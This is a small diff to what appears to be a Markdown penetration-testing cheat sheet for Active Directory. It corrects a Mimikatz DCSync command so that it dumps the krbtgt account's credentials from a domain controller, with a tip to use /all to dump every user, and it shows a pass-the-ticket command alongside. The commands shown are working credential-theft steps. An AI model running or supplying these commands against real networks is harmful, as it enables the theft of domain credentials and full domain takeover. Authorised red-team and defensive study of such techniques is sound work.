@@ -244,7 +244,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 #### Run DCSync to get credentials:
 - use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"/user:<DOMAIN>\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 ### Printer bug
